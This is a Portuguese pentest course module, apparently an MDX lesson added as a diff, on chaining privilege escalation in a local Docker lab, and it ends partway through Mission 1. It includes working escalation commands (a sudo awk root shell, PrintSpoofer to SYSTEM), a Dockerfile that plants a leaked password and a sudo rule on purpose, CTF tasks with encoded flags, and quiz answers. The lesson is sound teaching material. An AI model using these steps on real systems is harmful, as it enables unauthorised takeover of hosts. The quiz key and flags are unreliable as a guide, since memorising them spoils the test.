@@ -1,0 +1,605 @@
+---
+slug: mini-projeto-privesc
+track: trilha-6
+title: "Mini-projeto: da shell ao root/SYSTEM"
+prerequisites:
+  - privesc-linux-enumeracao
+  - privesc-linux-vetores
+  - privesc-windows-enumeracao
+  - privesc-windows-vetores
+lab: null
+tasks:
+  - slug: missao-1-foothold-dev
+    title: "Missão 1 — Do foothold ao usuário dev"
+    type: flag
+    prompt: "O conteúdo de /home/dev/flag_dev.txt, que só o dev lê. Você chega nele dando o primeiro salto: do foothold www-data para o usuário dev, usando uma credencial reutilizada que a enumeração revela. Cole no formato FLAG{...}."
+    hint: "Como www-data você não lê /home/dev, mas lê a config da aplicação em /var/www/app. Nela há uma senha — e um comentário dizendo que o dev reusa essa senha para o shell. Use su dev com ela."
+    flag:
+      hash: "scrypt$16384$8$1$671afc0614e5d1bd4f89d8c6432230ba2526b5ce552f2c14c35b3e0e4de8149c"
+      salt: "9d5d1aa4b41c26679558a568742bf01c"
+  - slug: missao-2-root
+    title: "Missão 2 — Do dev ao root"
+    type: flag
+    prompt: "O conteúdo de /root/flag_root.txt, lido depois do segundo salto: de dev para root. Re-enumere como dev (você agora enxerga o que o www-data não via) e abuse da regra de sudo que só o dev tem. Cole no formato FLAG{...}."
+    hint: "Como dev, rode sudo -l. Há uma regra NOPASSWD para um binário que o www-data não tinha. Procure esse binário no GTFOBins, seção Sudo: ele executa um comando que você escolhe. Abra um shell e leia /root/flag_root.txt."
+    flag:
+      hash: "scrypt$16384$8$1$dd56fde0b99989e4f5ac7ae4e89167a6b5ca8462fa82909bbe1533375967ea84"
+      salt: "0d0b3eeb6435d175f00535c7fd3f7192"
+  - slug: missao-3-windows
+    title: "Missão 3 — A cadeia Windows até SYSTEM"
+    type: flag
+    prompt: "O FLAG{...} do único caminho que, NESTE host Windows, leva o foothold do pool do IIS até SYSTEM. Há três caminhos estagiados, cada um com um token em base64; decodifique o do caminho que realmente funciona. Cole no formato FLAG{...}."
+    hint: "O foothold é a conta do pool do IIS e o whoami /priv mostra SeImpersonatePrivilege Enabled. Dos três caminhos, descarte o serviço que roda como conta virtual (não dá SYSTEM) e o que só te dá SERVICE_QUERY_STATUS (não reconfigura nada). Sobra o caminho do token; decodifique o base64 dele."
+    flag:
+      hash: "scrypt$16384$8$1$3e98847f6344bf82c29a2ae234bc33c459ef62eeb722063961fd5e676c55f80a"
+      salt: "676dcada76670cc87a00474a1a489f02"
+  - slug: quiz-final
+    title: "Quiz — Mini-projeto: da shell ao root/SYSTEM"
+    type: quiz
+    passPercent: 70
+    questions:
+      - question: "Qual é a diferença central entre os módulos 6.2–6.5 e este mini-projeto?"
+        options:
+          - "Nenhuma: este módulo só repete os quatro vetores de Linux e Windows"
+          - "Lá cada módulo treinava um vetor isolado; aqui você encadeia acesso inicial e vários saltos de escalação num alvo só, decide a ordem e documenta o caminho — é a habilidade de juntar as peças"
+          - "Aqui você aprende um exploit novo de kernel que não apareceu antes"
+          - "Este módulo troca a prática por teoria: não há alvo para atacar"
+        answer: 1
+        explanation: "Um engajamento real quase nunca é 'um vetor e pronto'. Você cai num foothold de baixo privilégio e precisa encadear: enumerar, escolher o salto, escalar, re-enumerar como a nova identidade e repetir até root/SYSTEM — documentando cada passo. 6.2–6.5 te deram as peças (enumeração e vetores, Linux e Windows); este mini-projeto treina montá-las numa cadeia coerente, que é o que o relatório vai descrever."
+      - question: "Depois de pular do www-data para o usuário dev, por que re-enumerar é obrigatório — e não um capricho?"
+        options:
+          - "Porque a enumeração anterior apaga a si mesma e precisa ser refeita"
+          - "Porque cada identidade enxerga um conjunto diferente de coisas: o dev pode ter uma regra de sudo, pertencer a um grupo ou ler arquivos que o www-data nunca viu; o vetor para root pode estar invisível para o foothold e óbvio para a nova conta"
+          - "Porque o sudo só funciona na segunda tentativa"
+          - "Porque re-enumerar aumenta o seu privilégio automaticamente"
+        answer: 1
+        explanation: "Permissões no Linux (e no Windows) são por identidade. `sudo -l`, os grupos, os arquivos legíveis e os processos visíveis mudam quando você troca de usuário. No alvo deste módulo, a regra de sudo que leva a root pertence ao dev, não ao www-data — logo ela só aparece quando você re-enumera já como dev. Isso é situational awareness: tratar cada salto como um começo, não como uma continuação."
+      - question: "Você tem, no mesmo host, três opções: (a) uma credencial reutilizada que te leva a outra conta, (b) uma regra de sudo que abre shell de root, e (c) um kernel exploit público para a versão do kernel. Qual é a ordem de preferência e por quê?"
+        options:
+          - "Sempre (c) primeiro, por ser o mais poderoso"
+          - "Tanto faz: as três têm o mesmo risco"
+          - "Primeiro (a) e (b), que são confiáveis, estáveis e silenciosas; o kernel exploit (c) fica por último porque pode derrubar a máquina (kernel panic) e faz muito mais barulho"
+          - "Primeiro (c), porque os outros dois dependem de o administrador reiniciar a máquina"
+        answer: 2
+        explanation: "É a priorização que vem desde o 6.1: confiabilidade, estabilidade e ruído. Reusar uma credencial ou abusar de uma regra de sudo é quase garantido, não arrisca o host e deixa pouco rastro. Um kernel exploit funciona, mas pode travar a máquina inteira e acende alarmes — é o martelo, guardado para quando os caminhos limpos acabam. Nem (a) nem (b) precisam de reinício: você mesmo abre o shell."
+      - question: "No alvo deste módulo, a senha que leva ao usuário dev está num arquivo de configuração da aplicação legível pelo www-data. Que vetor de salto é esse, e por que ele é tão comum na vida real?"
+        options:
+          - "É um buffer overflow na aplicação web"
+          - "É reutilização de credencial (credential reuse): a mesma senha serve para o banco e para o login do shell do dev; é comum porque segredos vazam em arquivos de config, históricos e variáveis de ambiente, e pessoas reaproveitam senhas entre serviços"
+          - "É um ataque de força bruta contra o /etc/shadow"
+          - "É uma falha do próprio comando su"
+        answer: 1
+        explanation: "O salto não explora um bug: explora o hábito humano de reaproveitar senhas e de deixá-las em texto claro onde a aplicação (e quem a comprometeu) alcança — arquivos `.env`, `config.php`, histórico de shell, `/proc/*/environ`. Uma senha de banco que também é a senha de login de uma conta do sistema transforma um vazamento de config num salto de identidade. É por isso que gerenciar segredos e não reaproveitar senhas são controles de escalação, não só de higiene."
+      - question: "Por que 'documentar o caminho de ataque' (o attack path) não é burocracia, mas parte técnica do trabalho?"
+        options:
+          - "Porque sem documentação a escalação não funciona"
+          - "Porque o relatório é o produto do pentest: o caminho anotado (cada comando, a evidência e o horário em UTC de cada salto) permite reproduzir, provar e corrigir a cadeia; sem ele, 'virei root' é uma afirmação sem prova e o cliente não sabe o que consertar"
+          - "Porque a lei exige que todo comando seja impresso em papel"
+          - "Porque a documentação substitui a necessidade de pedir autorização"
+        answer: 1
+        explanation: "Quem paga o teste não quer só saber que caiu; quer a trilha para reproduzir e fechar cada elo. Um attack path é a sequência de saltos com o comando exato, a evidência (saída, screenshot) e o horário — o que permite ao time azul reencenar e remediar, e ao pentester provar o impacto. É também o esqueleto do relatório da Trilha 8. Anotar enquanto se escala (não depois, de memória) é a diferença entre um relatório sólido e um relato vago."
+      - question: "Na cadeia Windows deste módulo, por que o caminho por SeImpersonatePrivilege (PrintSpoofer) funciona aqui, enquanto no 6.5 o caminho certo foi outro?"
+        options:
+          - "Porque PrintSpoofer funciona sempre, em qualquer host"
+          - "Porque os vetores dependem do host: lá o Print Spooler estava desligado e sobrava o AlwaysInstallElevated; aqui o foothold é um pool do IIS com SeImpersonatePrivilege e o Spooler está ativo, então o abuso de token leva a SYSTEM — enumerar vários caminhos é o que garante uma alternativa"
+          - "Porque no 6.5 o Windows era de 32 bits"
+          - "Porque SeImpersonatePrivilege só existe em servidores IIS"
+        answer: 1
+        explanation: "Vetores não são universais: o que funciona depende da identidade do foothold e do que o host oferece. O PrintSpoofer abusa de SeImpersonatePrivilege provocando um serviço SYSTEM (o Print Spooler) a se conectar a um named pipe seu; se o Spooler está desligado (como no 6.5), esse caminho morre e você usa outro achado (lá, o AlwaysInstallElevated). Por isso a enumeração mapeia MÚLTIPLOS caminhos: a cadeia sobrevive quando um elo falta."
+      - question: "Você virou root dentro do contêiner de treino. Isso é o mesmo que ser root no seu WSL/Windows?"
+        options:
+          - "Sim, root é root em qualquer lugar"
+          - "Não: o uid 0 dentro de um contêiner é isolado do host; escapar para o host seria OUTRA escalação (montagens indevidas, docker.sock, capabilities excessivas do contêiner) — no treino, é justamente esse isolamento que torna seguro praticar"
+          - "Sim, porque o contêiner compartilha o kernel"
+          - "Não, porque o contêiner não tem usuário root"
+        answer: 1
+        explanation: "Compartilhar o kernel não é compartilhar privilégio: o root do contêiner é confinado por namespaces, cgroups e capabilities. Por isso você pode plantar um SUID, uma regra de sudo e uma credencial no contêiner sem risco para a sua máquina — o uid 0 de lá não manda no seu Windows/WSL. Num engajamento real, virar root num contêiner é só mais um degrau; sair dele para o host é uma escalação à parte, com seus próprios vetores."
+glossary:
+  - term: kill chain
+    definition: "O modelo que descreve uma invasão como uma sequência de fases encadeadas (do reconhecimento ao objetivo final), em que cada fase prepara a seguinte. A escalação local é a fase que transforma um acesso de baixo privilégio em controle do host; entendê-la como elo de uma cadeia explica por que cortar qualquer elo quebra o ataque."
+  - term: credential reuse
+    definition: "A reutilização da mesma senha ou chave em mais de um lugar (um serviço e uma conta do sistema, dois hosts, duas aplicações). Para o atacante é um salto barato: uma credencial achada num arquivo de config, histórico ou variável de ambiente abre outra identidade. É um dos vetores de movimento lateral e de escalação mais comuns no mundo real."
+  - term: situational awareness
+    definition: "No contexto de pós-exploração, a disciplina de reavaliar o ambiente a cada mudança de identidade: cada usuário ou conta de serviço enxerga permissões, grupos, arquivos e processos diferentes. Trocar de identidade sem re-enumerar é agir às cegas; o vetor seguinte costuma estar visível só para a nova identidade."
+  - term: blast radius
+    definition: "O alcance do estrago que um comprometimento pode causar antes de ser contido — quantos sistemas, contas e dados ficam ao alcance a partir de um ponto invadido. Reduzir o blast radius (segmentação de rede, privilégio mínimo, segredos isolados) é o que impede um único foothold de virar o host, e o host inteiro de virar a rede inteira."
+---
+
+import cadeia from "./img/cadeia-shell-ao-root.svg";
+import loop from "./img/loop-de-escalacao.svg";
+
+## 1. Abertura — o que você vai aprender e por quê
+
+Até aqui, a Trilha 6 te deu as peças separadas: no 6.2 e no 6.3 você aprendeu a enumerar e a explorar vetores de escalação em Linux; no 6.4 e no 6.5, a fazer o mesmo no Windows. Cada módulo treinou **um** vetor de cada vez, num alvo preparado para aquele vetor. O mundo real não é assim. Num engajamento, você cai numa <GlossaryTerm term="foothold">shell</GlossaryTerm> de baixo privilégio — uma <GlossaryTerm term="foothold">foothold</GlossaryTerm>, o acesso inicial de onde se executa comando no alvo — e tem diante de si uma máquina que **não** foi montada para ser fácil. Você precisa descobrir onde estão os vetores, **escolher a ordem**, e muitas vezes dar **mais de um salto** até chegar ao topo.
+
+Este é o mini-projeto que fecha a parte de escalação: um exercício de **encadeamento** (<GlossaryTerm term="exploit chain">exploit chain</GlossaryTerm>). Você vai partir de um foothold como a conta de serviço `www-data`, pular para um usuário comum usando uma credencial que a enumeração revela, e desse usuário virar `root` abusando de uma regra de `sudo` — dois saltos, cada um dependendo do anterior. Depois, vai percorrer a mesma lógica no Windows (como teoria e análise, já que o Windows não roda no seu WSL): de um foothold no pool do IIS até `SYSTEM`. E, o tempo todo, vai **documentar o caminho** — porque o produto de um pentest não é "virei root", é o relatório que prova e ensina a corrigir.
+
+**Ao final, você vai saber:**
+
+- encadear acesso inicial e escalação em **saltos**, usando a saída de um salto como entrada do próximo;
+- reconhecer e explorar a <GlossaryTerm term="credential reuse">credential reuse</GlossaryTerm> (reutilização de credencial) como vetor de salto entre contas;
+- re-enumerar como a nova identidade a cada salto (<GlossaryTerm term="situational awareness">situational awareness</GlossaryTerm>) e priorizar o vetor mais confiável e silencioso;
+- ler uma cadeia Windows (foothold do IIS → `SYSTEM`) e decidir qual caminho funciona naquele host;
+- documentar um <GlossaryTerm term="attack path">attack path</GlossaryTerm> (caminho de ataque) e entender a defesa como "cortar qualquer elo da cadeia".
+
+**Pré-requisitos:** 6.2 e 6.3 — PrivEsc Linux, enumeração e vetores (você vai usar `sudo -l`, `find`, `getcap` e o GTFOBins); 6.4 e 6.5 — PrivEsc Windows, enumeração e vetores (serviços, `SeImpersonatePrivilege`, os potato). Deste conjunto você traz as peças; aqui você as encadeia.
+
+**Tempo estimado:** 3 a 5 horas, incluindo montar o alvo e escrever o seu primeiro attack path.
+
+<Callout variant="ethics">
+Encadear acesso e escalação é exatamente o que um invasor faz — e por isso só se treina em ambiente autorizado. Toda a parte Linux acontece num contêiner descartável, na sua máquina, **sem rede**; a parte Windows é análise de saídas que você gera no seu próprio WSL. Fazer isto contra um sistema de terceiros, sem autorização por escrito, é crime no Brasil (Lei 12.737/2012 — ver 1.4). O limite não é decorativo: é parte de ser um profissional.
+</Callout>
+
+## 2. Teoria aprofundada — a escalação é uma cadeia
+
+A ideia mais importante deste módulo cabe numa frase: **a escalação raramente é um pulo; é uma escada.** Um invasor que compromete uma aplicação web não ganha `root` de brinde — ganha a identidade restrita sob a qual a aplicação roda (`www-data`, um pool do IIS, um usuário de serviço). Dali até o controle do host há, quase sempre, **vários degraus**, e a arte está em achá-los e subi-los na ordem certa.
+
+### 2.1 Onde a escalação mora na kill chain
+
+Ajuda enxergar o quadro maior. Uma invasão costuma ser descrita como uma <GlossaryTerm term="kill chain">kill chain</GlossaryTerm>: uma sequência de fases encadeadas — reconhecimento, acesso inicial, **escalação de privilégio**, movimento lateral, ação sobre o objetivo. Cada fase prepara a seguinte. A <GlossaryTerm term="local privilege escalation">local privilege escalation</GlossaryTerm> que você treinou nos módulos anteriores é a fase que transforma um acesso qualquer num acesso **poderoso** — e é o que destrava quase tudo o que vem depois (ler segredos, instalar persistência, pivotar para outras máquinas).
+
+Dentro dessa fase, há dois tipos de salto que você vai usar o tempo todo:
+
+- **Salto vertical** (<GlossaryTerm term="vertical privilege escalation">vertical privilege escalation</GlossaryTerm>): subir de nível na mesma máquina — de `www-data` para `root`, de um usuário para `SYSTEM`. É o foco da Trilha 6.
+- **Salto lateral** (<GlossaryTerm term="lateral movement">lateral movement</GlossaryTerm>): mover-se para outra identidade de **mesmo** nível, ou para outro host — por exemplo, de `www-data` para o usuário `dev`, que não é mais poderoso, mas **enxerga coisas diferentes** e pode ter o vetor vertical que falta.
+
+O mini-projeto encadeia os dois: um salto lateral (`www-data` → `dev`, via credencial reutilizada) **habilita** o salto vertical (`dev` → `root`, via `sudo`). Sem o lateral, o vertical nem aparece.
+
+### 2.2 O ciclo: enumerar, escolher, escalar, repetir
+
+Encadear tem um método, e ele é um ciclo. A cada identidade que você assume, recomeça:
+
+<Figure
+  src={loop}
+  alt="O ciclo de escalação em quatro etapas: 1, enumerar o que a identidade atual enxerga; 2, escolher o vetor, priorizando o confiável e silencioso e deixando o kernel exploit por último; 3, escalar e assumir a nova identidade; 4, re-enumerar como a nova identidade (que vê o que a anterior não via), voltando à etapa 1. O ciclo para quando a identidade atual é root ou SYSTEM; ao lado, a nota de documentar cada etapa, formando o caminho de ataque."
+  caption="O ciclo da escalação local. O erro mais comum do iniciante é pular a etapa 4 — re-enumerar como a nova identidade — e ficar cego para o próximo degrau."
+/>
+
+A etapa 2 carrega uma regra de ouro que vem desde o 6.1: **prioridade para o confiável e silencioso.** Diante de vários vetores, você escolhe primeiro o que é mais garantido, mais estável e faz menos barulho — uma credencial reutilizada, uma regra de `sudo`, um binário gravável. O kernel exploit, por mais poderoso, fica por **último**: ele pode derrubar a máquina (um *kernel panic* interrompe o engajamento e, pior, o serviço do cliente) e acende muito mais alarmes.
+
+A etapa 4 é a que separa quem sabe do iniciante. Permissões são **por identidade**: o `sudo -l`, os grupos, os arquivos legíveis e os processos visíveis mudam quando você troca de usuário. Trocar de identidade e continuar raciocinando com a enumeração antiga é agir às cegas. Isso é <GlossaryTerm term="situational awareness">situational awareness</GlossaryTerm>: tratar cada salto como um novo começo.
+
+### 2.3 O vetor de salto deste módulo: credential reuse
+
+O salto lateral do mini-projeto é a <GlossaryTerm term="credential reuse">credential reuse</GlossaryTerm>, e vale entender por que ela é tão comum. Aplicações guardam segredos — senhas de banco, chaves de API — e precisam lê-los em tempo de execução. Eles acabam em arquivos de configuração (`.env`, `config.php`), em variáveis de ambiente (`/proc/<pid>/environ`), no histórico de shell. Quem compromete a aplicação herda o acesso a esses arquivos. E aí entra o fator humano: **as mesmas senhas são reaproveitadas** — a senha do banco vira a senha de login de uma conta do sistema; a senha de um serviço serve noutro host. Uma credencial vazada num arquivo de config deixa de ser "só" um vazamento e vira um salto de identidade. Não há exploit nenhum: há um segredo no lugar errado e uma senha usada duas vezes.
+
+### 2.4 Por que pensar em cadeia muda a defesa
+
+Há uma recompensa enorme em enxergar a escalação como cadeia: a defesa fica **mais fácil**, não mais difícil. Um ataque de N saltos precisa de **todos** os N elos; o defensor só precisa quebrar **um**. Se a senha do banco não fosse reutilizada, o salto lateral morreria. Se o `dev` não tivesse aquela regra de `sudo`, o salto vertical morreria. Se o foothold estivesse isolado (menos privilégio, menos leitura), a cadeia nem começaria.
+
+É aqui que entra o conceito de <GlossaryTerm term="blast radius">blast radius</GlossaryTerm> (raio de alcance): o quanto um comprometimento consegue alcançar antes de ser contido. Segmentar a rede, dar privilégio mínimo a cada conta e isolar segredos encurta esse raio — faz com que um foothold continue sendo só um foothold. Guarde isso: toda a Seção 8 é, no fundo, "onde cortar a cadeia".
+
+## 3. Como o ataque funciona — a mecânica da cadeia
+
+Vamos ver a cadeia Linux inteira em ação, com os comandos e as saídas reais do alvo que você vai montar na Seção 5. O ponto de partida é sempre o foothold: você acabou de cair como a conta de serviço da aplicação.
+
+<Figure
+  src={cadeia}
+  alt="As duas trilhas da cadeia. Em cima, Linux: foothold www-data uid 33 dá o salto 1 (credencial reutilizada, su dev) para o usuário dev uid 1000, e o salto 2 (sudo awk do GTFOBins) para root uid 0. Embaixo, Windows: foothold do pool do IIS dá um salto único (SeImpersonatePrivilege mais Print Spooler, via PrintSpoofer) até SYSTEM. Uma faixa lembra de re-enumerar a cada salto e registrar comando, evidência e horário, formando o caminho de ataque."
+  caption="A cadeia dos dois ambientes. Cada seta é um salto que só se abre depois do anterior; o que muda entre Linux e Windows é a mecânica, não a lógica."
+/>
+
+### 3.1 O foothold
+
+```console
+www-data@privesc:/$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+Uma conta de serviço, sem grupos interessantes. Primeira coisa do ciclo: enumerar o que **esta** identidade vê. Como `www-data`, você não lê `/home/dev`, mas lê os arquivos da aplicação que você "é":
+
+```console
+www-data@privesc:/$ cat /var/www/app/config.php
+<?php
+// App configuration (synced with the maintenance OS account "dev").
+$DB_HOST = '127.0.0.1';
+$DB_USER = 'appsvc';
+$DB_PASS = 'D3vOps!redis2024';   // ops: dev reuses this for shell login
+```
+
+Aí está o salto: uma senha **e** um comentário dizendo que o usuário `dev` a reaproveita no login. Isso é `credential reuse` servida num arquivo de config.
+
+### 3.2 Salto 1 — lateral, por credential reuse
+
+```console
+www-data@privesc:/$ su dev
+Password:
+dev@privesc:/$ id
+uid=1000(dev) gid=1000(dev) groups=1000(dev)
+```
+
+Você digita a senha achada (ela não aparece na tela) e vira `dev`. Repare: `dev` **não** é mais poderoso que `www-data` — é outro usuário comum. Mas é uma **identidade diferente**, e é isso que importa. O primeiro arquivo que só ele lê já se abre:
+
+```console
+dev@privesc:/$ cat /home/dev/flag_dev.txt
+```
+
+### 3.3 Salto 2 — vertical, re-enumerando como dev
+
+Agora a etapa 4 do ciclo: re-enumerar, mas **como `dev`**. O que o `www-data` não via:
+
+```console
+dev@privesc:/$ sudo -l
+Matching Defaults entries for dev on privesc:
+    env_reset, mail_badpass, use_pty
+
+User dev may run the following commands on privesc:
+    (root) NOPASSWD: /usr/bin/awk
+```
+
+O `dev` pode rodar o `awk` como `root`, sem senha. O `www-data` não tinha regra nenhuma — este vetor **só existe para a nova identidade**. Pelo GTFOBins, o `awk` executa um comando via `BEGIN { system(...) }`, e o `sudo` o roda como `root`:
+
+```console
+dev@privesc:/$ sudo awk 'BEGIN{system("/bin/sh")}'
+# id
+uid=0(root) gid=0(root) groups=0(root)
+# cat /root/flag_root.txt
+```
+
+Dois saltos, duas identidades, um `uid=0`. Nenhum exploit escrito sob medida: uma senha reaproveitada e uma regra de `sudo` generosa demais — exatamente os dois elos que o 6.1 chamou de "cruzamento entre o que você controla e o que tem poder", agora **em sequência**.
+
+### 3.4 A mesma lógica no Windows
+
+No Windows a mecânica muda, a lógica não. O foothold típico de uma web shell é a conta do pool do IIS, que costuma carregar `SeImpersonatePrivilege`. Um único salto resolve:
+
+```console
+c:\inetpub\wwwroot> whoami
+iis apppool\apppool
+
+c:\inetpub\wwwroot> whoami /priv | findstr /i impersonate
+SeImpersonatePrivilege        Impersonate a client after authentication    Enabled
+
+c:\inetpub\wwwroot> PrintSpoofer.exe -i -c cmd
+[+] Found privilege: SeImpersonatePrivilege
+[+] Named pipe listening...
+[+] CreateProcessAsUser() OK
+
+c:\windows\system32> whoami
+nt authority\system
+```
+
+O PrintSpoofer abusa de <GlossaryTerm term="SeImpersonatePrivilege">SeImpersonatePrivilege</GlossaryTerm> provocando o <GlossaryTerm term="Print Spooler">Print Spooler</GlossaryTerm> (um serviço que roda como <GlossaryTerm term="LocalSystem">LocalSystem</GlossaryTerm>) a se conectar a um *named pipe* seu; você então veste o token dele e vira `SYSTEM`. É o mesmo encadeamento: o foothold tem o privilégio (controle), o Spooler tem o poder, e a <GlossaryTerm term="potato attack">potato</GlossaryTerm> os junta.
+
+## 4. Casos reais — cadeias que viraram manchete
+
+Escalação encadeada não é exercício de laboratório: é como as invasões de verdade acontecem. Dois casos, verificados na fonte, mostram os dois lados — o valor da cadeia para o atacante e o valor de **cortar um elo** para o defensor.
+
+### ProxyLogon / HAFNIUM — Microsoft Exchange (2021)
+
+Em **2 de março de 2021**, a Microsoft divulgou que o grupo HAFNIUM explorava, como *zero-day*, uma cadeia de falhas no Exchange Server local. O primeiro elo era a **CVE-2021-26855**, uma *server-side request forgery* (SSRF) que permitia ao atacante **se autenticar como o próprio servidor Exchange**, sem credenciais (CVSS v3.1 **9.1**, publicada em 3 de março de 2021). De posse dessa autenticação, o segundo elo era a **CVE-2021-27065**, uma escrita de arquivo arbitrária pós-autenticação (CVSS v3.1 **7.8**, publicada em 3 de março de 2021): com ela, os atacantes **gravavam uma web shell** no servidor. A partir daí, executavam comandos, despejavam credenciais e exfiltravam caixas de correio — e uma falha irmã da cadeia, a CVE-2021-26857, chegava a executar código **como SYSTEM**.
+
+- **Impacto:** comprometimento de dezenas de milhares de servidores Exchange no mundo; acesso de leitura/escrita a e-mails corporativos e execução de código no host.
+- **Lição:** é o retrato do encadeamento — nenhum elo sozinho dava tudo. O SSRF dava identidade; a escrita de arquivo dava a web shell; a web shell dava a execução. **Corrigir qualquer um** quebrava a cadeia. Por isso a resposta foi aplicar o patch com urgência: fechar um elo bastava.
+- **Fonte:** [HAFNIUM targeting Exchange Servers with 0-day exploits (Microsoft Security Blog, 2021-03-02)](https://www.microsoft.com/en-us/security/blog/2021/03/02/hafnium-targeting-exchange-servers/).
+
+### Equifax (2017) — um foothold, sem barreiras internas
+
+Em 2017, a Equifax sofreu uma das maiores violações de dados da história. O elo inicial foi a **CVE-2017-5638**, uma execução remota de código no **Apache Struts 2** (parser Jakarta Multipart), explorável por um cabeçalho `Content-Type` forjado — CVSS v3.1 **9.8**, publicada em **11 de março de 2017** e **explorada na natureza já em março de 2017**. A Apache havia lançado a correção; a Equifax deixou o portal público de contestação (dispute portal) **sem o patch**, e os atacantes entraram por ele. O desastre, porém, não foi o foothold — foi o que havia **depois** dele: segundo o relatório do GAO, o acesso às bases de dados **não era segmentado**, então, a partir do portal, os invasores alcançaram dados de **ao menos 145,5 milhões de pessoas**. A intrusão passou **meses** despercebida, até ser descoberta em julho de 2017.
+
+- **Impacto:** dados pessoais de pelo menos 145,5 milhões de indivíduos; um dos maiores vazamentos já registrados.
+- **Lição:** é a cadeia vista pelo lado da defesa. Um único serviço web sem patch começou tudo, mas foi a **falta de barreiras internas** (segmentação, privilégio mínimo) que transformou um foothold numa catástrofe. Encurtar o <GlossaryTerm term="blast radius">blast radius</GlossaryTerm> teria contido o estrago mesmo com o primeiro elo rompido.
+- **Fontes:** [GAO-18-559 — Data Protection: Actions Taken by Equifax and Federal Agencies in Response to the 2017 Breach](https://www.gao.gov/products/gao-18-559) e [NVD — CVE-2017-5638](https://nvd.nist.gov/vuln/detail/CVE-2017-5638).
+
+## 5. Mãos à obra — da shell ao root, e lendo a cadeia Windows
+
+Este módulo **não tem lab próprio** na plataforma, pelo mesmo motivo de segurança do 6.3: um alvo de escalação encadeada é uma máquina **mal configurada de propósito**, e a plataforma só orquestra alvos consagrados (DVWA, Juice Shop...). Então você monta, **na sua própria máquina (WSL)**, um contêiner descartável de treino — como no 6.3, mas agora **encadeado**: você cai como `www-data` e precisa de **dois saltos** para chegar a `root`. A parte Windows é análise de saídas que você gera no WSL.
+
+<Callout variant="info" title="Por que um contêiner, e por que sem rede">
+O `uid 0` **dentro** do contêiner não é o `root` do seu WSL/Windows (releia o 6.1): ele é isolado por namespaces e capabilities. Por isso dá para plantar uma credencial, uma regra de `sudo` e flags de root ali dentro sem risco nenhum para a sua máquina. E tudo sobe com `--network none` (sem rede) e `--rm` (some ao sair). É o ambiente certo para encadear escalação com segurança.
+</Callout>
+
+**Objetivo:** ao terminar, você terá (1) saltado do foothold `www-data` para o usuário `dev` por uma credencial reutilizada e lido `/home/dev/flag_dev.txt`; (2) saltado de `dev` para `root` por uma regra de `sudo` que só o `dev` tem, e lido `/root/flag_root.txt`; e (3) decidido, na cadeia Windows, qual dos três caminhos leva o foothold do IIS a `SYSTEM`. Três flags, uma por missão — e, de brinde, o seu primeiro attack path escrito.
+
+### 5.1 Montar o alvo encadeado (passo a passo)
+
+Abra o terminal do Ubuntu (WSL), crie uma pasta e os dois arquivos abaixo. O `Dockerfile` é a receita da máquina encadeada; o `entrypoint.sh` liga o ambiente e te deixa como o foothold `www-data`.
+
+<CodeBlock
+  title="~/privesc-chain/Dockerfile"
+  lang="text"
+  code={`FROM debian:trixie-slim
+ENV DEBIAN_FRONTEND=noninteractive
+RUN apt-get update \\
+ && apt-get install -y --no-install-recommends \\
+    sudo gawk procps findutils login passwd \\
+ && rm -rf /var/lib/apt/lists/*
+
+# Foothold: the web service account you land on (www-data already exists).
+RUN install -d -o www-data -g www-data /var/www/app
+
+# Second identity, reached by a reused credential found as www-data.
+RUN useradd --create-home --shell /bin/bash --uid 1000 dev \\
+ && echo 'dev:D3vOps!redis2024' | chpasswd
+
+# App config, readable by the web user, leaking the dev password.
+RUN printf '%s\\n' \\
+  '<?php' \\
+  '// App configuration (synced with the maintenance OS account "dev").' \\
+  "\\$DB_HOST = '127.0.0.1';" \\
+  "\\$DB_USER = 'appsvc';" \\
+  "\\$DB_PASS = 'D3vOps!redis2024';   // ops: dev reuses this for shell login" \\
+  > /var/www/app/config.php \\
+ && chown root:www-data /var/www/app/config.php \\
+ && chmod 640 /var/www/app/config.php
+
+# Flag 1: readable only after you become dev. (base64, so it is not in clear text)
+RUN echo 'RkxBR3twaXZvdC1jcmVkLXJldXNlLXd3dy10by1kZXZ9' | base64 -d > /home/dev/flag_dev.txt \\
+ && chown dev:dev /home/dev/flag_dev.txt && chmod 600 /home/dev/flag_dev.txt
+
+# Hop 2 vector: only dev may run awk as root without a password.
+RUN echo 'dev ALL=(root) NOPASSWD: /usr/bin/awk' > /etc/sudoers.d/90-dev \\
+ && chmod 440 /etc/sudoers.d/90-dev
+
+# Flag 2: readable only after you become root.
+RUN echo 'RkxBR3tjaGFpbi1kZXYtc3Vkby10by1yb290fQ==' | base64 -d > /root/flag_root.txt \\
+ && chmod 600 /root/flag_root.txt
+
+COPY entrypoint.sh /usr/local/sbin/entrypoint.sh
+RUN chmod 755 /usr/local/sbin/entrypoint.sh
+ENTRYPOINT ["/usr/local/sbin/entrypoint.sh"]`}
+/>
+
+<CodeBlock
+  title="~/privesc-chain/entrypoint.sh"
+  lang="bash"
+  code={`#!/bin/sh
+# Map the hostname (silences a sudo warning) and drop you into the foothold.
+echo "127.0.0.1 localhost $(hostname)" > /etc/hosts
+exec runuser -u www-data -- /bin/bash -l`}
+/>
+
+As duas flags do `Dockerfile` estão em **base64** de propósito: assim o texto da flag não vai em claro no módulo, mas, ao montar o contêiner, o arquivo nasce com a flag **certa** (a que a plataforma valida). Você só vai lê-la depois de escalar — é aí que está o exercício. Construa a imagem (isto usa a internet da sua máquina, uma vez só) e suba o contêiner **sem rede**:
+
+```console
+$ cd ~/privesc-chain
+$ docker build -t privesc-chain:local .
+$ docker run -it --rm --network none --hostname privesc privesc-chain:local
+```
+
+Você cai num shell. Confirme quem é:
+
+```console
+www-data@privesc:/$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+Um foothold, exatamente como depois de uma web shell. A partir daqui, os dois saltos.
+
+<Callout variant="tip" title="Se o docker pedir permissão">
+Se `docker` reclamar, rode com `sudo docker ...` ou adicione seu usuário ao grupo `docker` (lembre do 6.2: estar no grupo `docker` já é, por si só, um caminho a root no host). No WSL com Docker Desktop isso costuma já estar pronto.
+</Callout>
+
+### 5.2 Missão 1 — Do foothold ao usuário dev (guiada)
+
+Você é `www-data` e quer subir. Comece pela regra do ciclo: enumere o que **esta** identidade enxerga. Você não lê `/home/dev`, mas lê o que a aplicação lê — comece pela configuração dela, em `/var/www/app`.
+
+```console
+www-data@privesc:/$ cat /var/www/app/config.php
+<?php
+// App configuration (synced with the maintenance OS account "dev").
+$DB_HOST = '127.0.0.1';
+$DB_USER = 'appsvc';
+$DB_PASS = 'D3vOps!redis2024';   // ops: dev reuses this for shell login
+```
+
